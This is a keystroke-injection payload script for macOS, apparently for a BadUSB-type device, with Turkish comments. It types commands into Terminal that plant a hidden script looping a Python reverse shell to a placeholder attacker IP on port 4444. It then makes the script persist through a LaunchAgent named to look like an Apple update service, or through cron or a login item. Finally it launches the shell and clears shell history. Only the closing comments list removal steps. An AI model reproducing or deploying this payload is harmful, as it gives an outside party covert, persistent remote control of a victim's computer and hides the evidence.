// ═══════════════════════════════════════════════════════════════════════════
// Payload: mac_persistence.js
// Target:  macOS
// Time:    ~8 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: LaunchAgent ile kalıcı reverse shell
// Her login'de otomatik bağlanır
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var LHOST = "ATTACKER_IP";   // Listener IP
var LPORT = "4444";          // Listener port

// LaunchAgent label (Apple service gibi görünür)
var AGENT_LABEL = "com.apple.systemupdated";

// Persistence tipi: "launchagent" | "cron" | "loginitem"
var PERSIST_TYPE = "launchagent";

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN TERMINAL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-SPACE");
delay(500);
type("terminal");
delay(500);
press("ENTER");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: CREATE BACKDOOR SCRIPT                                          │
// └─────────────────────────────────────────────────────────────────────────┘
// Gizli backdoor script oluştur
type("mkdir -p ~/.config && cat > ~/.config/.updater << 'BACKDOOREOF'");
press("ENTER");
type("#!/bin/bash");
press("ENTER");
type("while true; do");
press("ENTER");
type("  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + LHOST + "\"," + LPORT + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/zsh\",\"-i\"])' 2>/dev/null");
press("ENTER");
type("  sleep 60");
press("ENTER");
type("done");
press("ENTER");
type("BACKDOOREOF");
press("ENTER");
delay(300);

type("chmod +x ~/.config/.updater");
press("ENTER");
delay(300);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4A: LAUNCHAGENT PERSISTENCE                                        │
// └─────────────────────────────────────────────────────────────────────────┘
if (PERSIST_TYPE == "launchagent") {
    // LaunchAgents dizini oluştur
    type("mkdir -p ~/Library/LaunchAgents");
    press("ENTER");
    delay(300);
    
    // Plist oluştur
    type("cat > ~/Library/LaunchAgents/" + AGENT_LABEL + ".plist << 'PLISTEOF'");
    press("ENTER");
    type("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
    press("ENTER");
    type("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
    press("ENTER");
    type("<plist version=\"1.0\">");
    press("ENTER");
    type("<dict>");
    press("ENTER");
    type("  <key>Label</key>");
    press("ENTER");
    type("  <string>" + AGENT_LABEL + "</string>");
    press("ENTER");
    type("  <key>ProgramArguments</key>");
    press("ENTER");
    type("  <array>");
    press("ENTER");
    type("    <string>/bin/bash</string>");
    press("ENTER");
    type("    <string>-c</string>");
    press("ENTER");
    type("    <string>~/.config/.updater</string>");
    press("ENTER");
    type("  </array>");
    press("ENTER");
    type("  <key>RunAtLoad</key>");
    press("ENTER");
    type("  <true/>");
    press("ENTER");
    type("  <key>KeepAlive</key>");
    press("ENTER");
    type("  <true/>");
    press("ENTER");
    type("  <key>StandardErrorPath</key>");
    press("ENTER");
    type("  <string>/dev/null</string>");
    press("ENTER");
    type("  <key>StandardOutPath</key>");
    press("ENTER");
    type("  <string>/dev/null</string>");
    press("ENTER");
    type("</dict>");
    press("ENTER");
    type("</plist>");
    press("ENTER");
    type("PLISTEOF");
    press("ENTER");
    delay(500);
    
    // LaunchAgent'ı yükle
    type("launchctl load ~/Library/LaunchAgents/" + AGENT_LABEL + ".plist 2>/dev/null");
    press("ENTER");
    delay(500);
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4B: CRON PERSISTENCE (Alternative)                                 │
// └─────────────────────────────────────────────────────────────────────────┘
if (PERSIST_TYPE == "cron") {
    type("(crontab -l 2>/dev/null | grep -v '.updater'; echo '*/1 * * * * ~/.config/.updater') | crontab -");
    press("ENTER");
    delay(500);
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4C: LOGIN ITEM PERSISTENCE (Alternative)                           │
// └─────────────────────────────────────────────────────────────────────────┘
if (PERSIST_TYPE == "loginitem") {
    // AppleScript ile Login Items'a ekle
    type("osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"~/.config/.updater\", hidden:true}' 2>/dev/null");
    press("ENTER");
    delay(500);
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: START IMMEDIATELY                                               │
// └─────────────────────────────────────────────────────────────────────────┘
type("~/.config/.updater &");
press("ENTER");
delay(500);
type("disown");
press("ENTER");
delay(300);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
type("history -c && exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PERSISTENCE LOCATIONS                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// Backdoor: ~/.config/.updater
// LaunchAgent: ~/Library/LaunchAgents/com.apple.systemupdated.plist
// 
// Kaldırmak için:
// launchctl unload ~/Library/LaunchAgents/com.apple.systemupdated.plist
// rm ~/Library/LaunchAgents/com.apple.systemupdated.plist
// rm ~/.config/.updater
// 
// Kontrol:
// launchctl list | grep systemupdated
// crontab -l

